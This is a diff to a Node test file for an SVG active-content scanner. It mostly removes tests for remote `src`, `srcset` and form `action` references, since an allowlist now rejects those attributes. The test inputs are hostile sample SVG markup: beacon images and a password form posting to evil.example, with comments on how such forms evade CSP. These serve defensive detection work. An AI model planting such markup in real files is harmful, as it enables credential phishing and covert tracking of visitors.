@@ -3,54 +3,16 @@
 //
 // These live outside tests/svg-active-content.test.mjs because they cover a
 // detection gap rather than the branch coverage that file is organised around:
-// each case below passed the scanner silently before the `src`, `<link>` and
+// each case below passed the scanner silently before the `<link>` and
 // bare-string `@import` handling was added, so each one fails without it.
+// Attributes such as `src`, `srcset` and `action` are not covered here: they
+// are off the attribute allowlist, so findActiveContent() rejects them by name.
 import assert from 'node:assert/strict';
 import test from 'node:test';
 import { findRemoteReferences } from '../scripts/lib/svg-active-content.mjs';
 
 const svg = (body) =>
   `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">${body}</svg>`;
-
-test('reports a remote src on HTML embedded in a foreignObject', () => {
-  // `foreignObject` is deliberately allowed (draw.io emits it for ordinary
-  // text), so the HTML inside it reaches the site origin. `<img src>` fetches
-  // from the host in the value the moment the SVG is opened directly.
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><img src="https://evil.example/beacon.png"/></foreignObject>',
-      ),
-    ),
-    [
-      'references a remote resource in <img> src: https://evil.example/beacon.png',
-    ],
-  );
-});
-
-test('reports a remote src regardless of the element carrying it', () => {
-  // `src` is not an SVG attribute, so unlike `href` there is no element it
-  // reads as navigation on and nothing to allow-list against.
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><video src="//evil.example/clip.mp4"></video></foreignObject>',
-      ),
-    ),
-    ['references a remote resource in <video> src: //evil.example/clip.mp4'],
-  );
-});
-
-test('leaves a relative or data src alone', () => {
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><img src="./local.png"/><img src="data:image/png;base64,AAAA"/></foreignObject>',
-      ),
-    ),
-    [],
-  );
-});
 
 test('reports a remote stylesheet href on a <link>', () => {
   assert.deepEqual(
@@ -201,78 +163,4 @@ test('reports a remote reference in a style attribute written with character ref
   assert.deepEqual(findRemoteReferences(svg), [
     'references a remote resource in a style attribute: https://evil.example/e.png',
   ]);
-});
-
-test('reports srcset, poster and background targets', () => {
-  const svg =
-    '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject>' +
-    '<img srcset="/ok.png 1x, https://evil.example/1.png 2x"/>' +
-    '<video poster="https://evil.example/p.png"/>' +
-    '<body background="//evil.example/b.png"/></foreignObject></svg>';
-  assert.deepEqual(findRemoteReferences(svg).sort(), [
-    'references a remote resource in <body> background: //evil.example/b.png',
-    'references a remote resource in <img> srcset: https://evil.example/1.png',
-    'references a remote resource in <video> poster: https://evil.example/p.png',
-  ]);
-});
-
-// Submission targets. A form posts nothing until a visitor submits it, so it
-// is not a subresource fetch; it is in this file because it reached the
-// published corpus through the identical gap -- an attribute the scanner had
-// no rule for, carrying an ordinary https URL that no scheme check objects to.
-test('reports a remote form action on HTML embedded in a foreignObject', () => {
-  // script-src 'none' makes this HTML inert without constraining the form, and
-  // form-action is a navigation directive, so the header's default-src 'none'
-  // is not its fallback. The address bar still reads as this origin while the
-  // password goes to evil.example.
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><form action="https://evil.example/collect" method="post">' +
-          '<input type="password" name="pw"/><button>Sign in</button></form></foreignObject>',
-      ),
-    ),
-    ['submits to a remote host in <form> action: https://evil.example/collect'],
-  );
-});
-
-test('reports a formaction that overrides a same-origin action', () => {
-  // The <form> itself reads as same-origin in a diff; the button re-points it.
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><form action="/local"><button formaction="https://evil.example/c">go</button>' +
-          '<input type="submit" formaction="//evil.example/d"/></form></foreignObject>',
-      ),
-    ),
-    [
-      'submits to a remote host in <button> formaction: https://evil.example/c',
-      'submits to a remote host in <input> formaction: //evil.example/d',
-    ],
-  );
-});
-
-test('reports a cleartext form action', () => {
-  // `http:` with however many separators reaches the named host just as `//`
-  // does, and a browser that upgrades the submission still sends it there.
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><form action="http:evil.example/c"><button>x</button></form></foreignObject>',
-      ),
-    ),
-    ['submits to a remote host in <form> action: http://evil.example/c'],
-  );
-});
-
-test('leaves a relative or same-origin form action alone', () => {
-  assert.deepEqual(
-    findRemoteReferences(
-      svg(
-        '<foreignObject><form action="/search"><button formaction="./go">x</button></form>' +
-          '<form><button>no action at all</button></form></foreignObject>',
-      ),
-    ),
-    [],
-  );
 });
